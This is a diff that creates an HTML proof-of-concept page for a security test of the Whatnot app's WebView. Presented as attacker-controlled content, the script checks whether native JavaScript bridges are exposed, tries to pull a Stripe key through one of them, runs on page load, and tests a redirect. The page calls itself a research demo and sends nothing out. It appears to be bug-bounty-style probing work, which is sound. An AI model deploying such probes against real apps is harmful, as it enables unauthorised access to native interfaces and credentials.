@@ -1,16 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Whatnot WebView PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 15px;
+      background: #fff;
+    }
+
+    .card {
+      max-width: 420px;
+      margin: auto;
+      padding: 15px;
+      border: 1px solid #eee;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      margin-top: 0;
+    }
+
+    .log {
+      background: #000;
+      color: #0f0;
+      padding: 10px;
+      font-size: 12px;
+      height: 150px;
+      overflow-y: auto;
+      margin-top: 10px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      background: black;
+      color: white;
+      border-radius: 6px;
+    }
+
+    .note {
+      color: red;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="card">
+  <h2>🎁 Whatnot Promo (Security Test)</h2>
+
+  <p>This page is controlled by an external attacker but is rendered inside the app.</p>
+
+  <button onclick="testBridge()">Test Bridge</button>
+  <button onclick="redirectTest()">Try Redirect</button>
+
+  <div class="log" id="log"></div>
+
+  <p class="note">
+    ⚠️ Security research demo. No data is collected.
+  </p>
+</div>
+
 <script>
-function log(msg){
-  document.body.innerHTML += "<p>" + msg + "</p>";
+function log(msg) {
+  let el = document.getElementById("log");
+  el.innerHTML += msg + "<br>";
 }
 
-log("JSInterface: " + typeof window.JSInterface);
-log("JSDI: " + typeof window.JSDI);
+// Initial check
+log("=== PoC Loaded ===");
+log("URL: " + location.href);
 
-if (window.JSInterface) {
-  log("🔥 JSInterface FOUND");
+// Check all possible bridges
+function testBridge() {
+  log("---- Checking Bridges ----");
+
+  try {
+    log("androidBridge: " + typeof window.androidBridge);
+  } catch(e) {
+    log("androidBridge error");
+  }
+
+  try {
+    log("NativeStripeECE: " + typeof window.NativeStripeECE);
+  } catch(e) {
+    log("NativeStripeECE error");
+  }
+
+  try {
+    log("JSInterface: " + typeof window.JSInterface);
+  } catch(e) {
+    log("JSInterface error");
+  }
+
+  try {
+    log("JSDI: " + typeof window.JSDI);
+  } catch(e) {
+    log("JSDI error");
+  }
+
+  // Try calling something if exists
+  try {
+    if (window.NativeStripeECE) {
+      log("Trying Stripe key...");
+      let key = window.NativeStripeECE.getStripePublishableKey();
+      log("Stripe Key: " + key);
+    }
+  } catch(e) {
+    log("Stripe call failed: " + e.message);
+  }
 }
 
-if (window.JSDI) {
-  log("🔥 JSDI FOUND");
+// Try chaining navigation
+function redirectTest() {
+  log("Redirecting to Whatnot...");
+
+  setTimeout(() => {
+    location.href = "https://www.whatnot.com";
+  }, 2000);
 }
+
+// Auto run on load
+setTimeout(testBridge, 1000);
 </script>
+
+</body>
+</html>
